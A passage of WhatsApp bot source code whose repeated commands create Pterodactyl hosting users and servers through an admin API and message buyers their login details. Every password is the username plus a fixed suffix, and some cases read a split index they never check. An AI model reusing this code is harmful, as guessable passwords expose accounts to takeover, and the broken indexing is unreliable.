┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${xdate}
┃ *O'clock :* ${xtime}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username and Password Have Been Sent
To @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp9gb': 
case '9gb':
case 'panel9gb': {
if (!isPremium && !isCreator) return replyprem(mess.prem)
let t = text.split(',');
if (t.length < 2) return newReply(`Example : ${prefix+command} username,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender: t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net': m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "9100"
let cpu = "270"
let disk = "9100"
let email = username + "@gmail.com"
let password = username + "72bdd9"
if (!u) return
let d = (await ToxxicTechInc.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${xdate}${xtime} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return newReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
newReply(`_Creating a Server for ${pushname}_`)
let ctf = `
*Hi @${u.split`@`[0]} Here's Your Panel Data*
*FROM @${m?.sender.split('@')[0]}* `+readmore+`
┏━ ⬣『 *ACCOUNT DATA*』⬣ ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
*CPU :*${cpu}%
┃ *Created :* ${pushname}
Day :* ${xdate}
┃ *Hour :* ${xtime}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *CAN CHANGE SC*
- *BOT CAN BE ON 24 HOURS*
- *WEB CLOSE BOT ON*
- *DO NOT WASTE QUOTA*
- *DOES NOT CONSUME HP RAM*
- 15 DAY WARRANTY*

*NOTES:*
- *TAKE GOOD CARE OF YOUR PANEL DATA*
- *OWN ONLY SEND 1X DATA*
- *ENTER GROUP FOR INFO*
- *SS PANEL WITH CP .DONE*
- *HUB ONW IF THERE ARE PROBLEMS*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SPREAD DOMAIN*

*RELATED? DELETED NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/b355e4b093846225b74ad.jpg" } }, { upload: ToxxicTechInc.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+By+Toxxic+Boy","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363336528578108@newsletter',
newsletterName: ownername,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await ToxxicTechInc.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return newReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await newReply(`
*Success create panel ✅*`+readmore+`
┏━  ⬣『 *ACCOUNT DATA*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${xdate}
┃ *O'clock :* ${xtime}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username and Password Have Been Sent
To @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp10gb': 
case '10gb':
case 'panel10gb': {
if (!isPremium && !isCreator) return replyprem(mess.prem)
let t = text.split(',');
if (t.length < 2) return newReply(`Example : ${prefix+command} username,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[3].replace(/[^+0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "10100"
let cpu = "300"
let disk = "10100"
let email = username + "@gmail.com"
let password = username + "72bdd9"
if (!u) return
let d = (await ToxxicTechInc.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${xdate}${xtime} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return newReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
newReply(`_Creating a Server for ${pushname}_`)
let ctf = `
*Hi @${u.split`@`[0]} Here's Your Panel Data*
*FROM @${m?.sender.split('@')[0]}* `+readmore+`
┏━ ⬣『 *ACCOUNT DATA*』⬣ ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
*CPU :*${cpu}%
┃ *Created :* ${pushname}
Day :* ${xdate}
┃ *Hour :* ${xtime}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *CAN CHANGE SC*
- *BOT CAN BE ON 24 HOURS*
- *WEB CLOSE BOT ON*
- *DO NOT WASTE QUOTA*
- *DOES NOT CONSUME HP RAM*
- 15 DAY WARRANTY*

*NOTES:*
- *TAKE GOOD CARE OF YOUR PANEL DATA*
- *OWN ONLY SEND 1X DATA*
- *ENTER GROUP FOR INFO*
- *SS PANEL WITH CP .DONE*
- *HUB ONW IF THERE ARE PROBLEMS*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SPREAD DOMAIN*

*RELATED? DELETED NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/b355e4b093846225b74ad.jpg" } }, { upload: ToxxicTechInc.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+By+Toxxic+Boy","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363336528578108@newsletter',
newsletterName: ownername,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await ToxxicTechInc.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return newReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await newReply(`
*Success create panel ✅*`+readmore+`
┏━  ⬣『 *ACCOUNT DATA*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${xdate}
┃ *O'clock :* ${xtime}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username and Password Have Been Sent
To @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp11gb': 
case '11gb':
case 'panel11gb': {
if (!isPremium && !isCreator) return replyprem(mess.prem)
let t = text.split(',');
if (t.length < 2) return newReply(`Example : ${prefix+command} username,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[3].replace(/[^+0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "11100"
let cpu = "300"
let disk = "11100"
let email = username + "@gmail.com"
let password = username + "72bdd9"
if (!u) return
let d = (await ToxxicTechInc.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${xdate}${xtime} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return newReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
newReply(`_Creating a Server for ${pushname}_`)
let ctf = `
*Hi @${u.split`@`[0]} Here's Your Panel Data*
*FROM @${m?.sender.split('@')[0]}* `+readmore+`
┏━ ⬣『 *ACCOUNT DATA*』⬣ ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :*${cpu}%
┃ *Created :* ${pushname}
┃ *Day :* ${xdate}
┃ *Hour :* ${xtime}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *CAN CHANGE SC*
- *BOT CAN BE ON 24 HOURS*
- *WEB CLOSE BOT ON*
- *DO NOT WASTE QUOTA*
- *DOES NOT CONSUME HP RAM*
- 15 DAY WARRANTY*

*NOTES:*
- *TAKE GOOD CARE OF YOUR PANEL DATA*
- *OWN ONLY SEND 1X DATA*
- *ENTER GROUP FOR INFO*
- *SS PANEL WITH CP .DONE*
- *HUB ONW IF THERE ARE PROBLEMS*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SPREAD DOMAIN*

*RELATED? DELETED NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/b355e4b093846225b74ad.jpg" } }, { upload: ToxxicTechInc.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+By+Toxxic+Boy","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363336528578108@newsletter',
newsletterName: ownername,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await ToxxicTechInc.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return newReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await newReply(`
*Success create panel ✅*`+readmore+`
┏━  ⬣『 *ACCOUNT DATA*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${xdate}
┃ *O'clock :* ${xtime}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username and Password Have Been Sent
To @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp12gb': 
case '12gb':
case 'panel12gb': {
if (!isPremium && !isCreator) return replyprem(mess.prem)
let t = text.split(',');
if (t.length < 2) return newReply(`Example : ${prefix+command} username,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[3].replace(/[^+0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "12100"
let cpu = "300"
let disk = "12100"
let email = username + "@gmail.com"
let password = username + "72bdd9"
if (!u) return
let d = (await ToxxicTechInc.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${xdate}${xtime} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return newReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
newReply(`_Creating a Server for ${pushname}_`)
let ctf = `
*Hi @${u.split`@`[0]} Here's Your Panel Data*
*FROM @${m?.sender.split('@')[0]}* `+readmore+`
┏━ ⬣『 *ACCOUNT DATA*』⬣ ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :*${cpu}%
┃ *Created :* ${pushname}
┃ *Day :* ${xdate}
┃ *Hour :* ${xtime}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *CAN CHANGE SC*
- *BOT CAN BE ON 24 HOURS*
- *WEB CLOSE BOT ON*
- *DO NOT WASTE QUOTA*
- *DOES NOT CONSUME HP RAM*
- 15 DAY WARRANTY*

*NOTES:*
- *TAKE GOOD CARE OF YOUR PANEL DATA*
- *OWN ONLY SEND 1X DATA*
- *ENTER GROUP FOR INFO*
- *SS PANEL WITH CP .DONE*
- *HUB ONW IF THERE ARE PROBLEMS*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SPREAD DOMAIN*

*RELATED? DELETED NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/b355e4b093846225b74ad.jpg" } }, { upload: ToxxicTechInc.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+By+Toxxic+Boy","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363336528578108@newsletter',
newsletterName: ownername,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await ToxxicTechInc.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return newReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await newReply(`
*Success create panel ✅*`+readmore+`
┏━  ⬣『 *ACCOUNT DATA*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${xdate}
┃ *O'clock :* ${xtime}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username and Password Have Been Sent
To @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp13gb': 
case '13gb':
case 'panel13gb': {
if (!isPremium && !isCreator) return replyprem(mess.prem)
let t = text.split(',');
if (t.length < 2) return newReply(`Example : ${prefix+command} username,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[3].replace(/[^+0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "13100"
let cpu = "300"
let disk = "13100"
let email = username + "@gmail.com"
let password = username + "72bdd9"
if (!u) return
let d = (await ToxxicTechInc.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${xdate}${xtime} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return newReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
newReply(`_Creating a Server for ${pushname}_`)
let ctf = `
*Hi @${u.split`@`[0]} Here's Your Panel Data*
*FROM @${m?.sender.split('@')[0]}* `+readmore+`
┏━ ⬣『 *ACCOUNT DATA*』⬣ ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
*CPU :*${cpu}%
┃ *Created :* ${pushname}
Day :* ${xdate}
┃ *Hour :* ${xtime}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *CAN CHANGE SC*
- *BOT CAN BE ON 24 HOURS*
- *WEB CLOSE BOT ON*
- *DO NOT WASTE QUOTA*
- *DOES NOT CONSUME HP RAM*
- 15 DAY WARRANTY*

*NOTES:*
- *TAKE GOOD CARE OF YOUR PANEL DATA*
- *OWN ONLY SEND 1X DATA*
- *ENTER GROUP FOR INFO*
- *SS PANEL WITH CP .DONE*
- *HUB ONW IF THERE ARE PROBLEMS*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SPREAD DOMAIN*

*RELATED? DELETED NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/b355e4b093846225b74ad.jpg" } }, { upload: ToxxicTechInc.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+By+Toxxic+Boy","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363336528578108@newsletter',
newsletterName: ownername,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await ToxxicTechInc.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return newReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await newReply(`
*Success create panel ✅*`+readmore+`
┏━  ⬣『 *ACCOUNT DATA*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${xdate}
┃ *O'clock :* ${xtime}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username and Password Have Been Sent
To @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp14gb': 
case '14gb':
case 'panel14gb': {
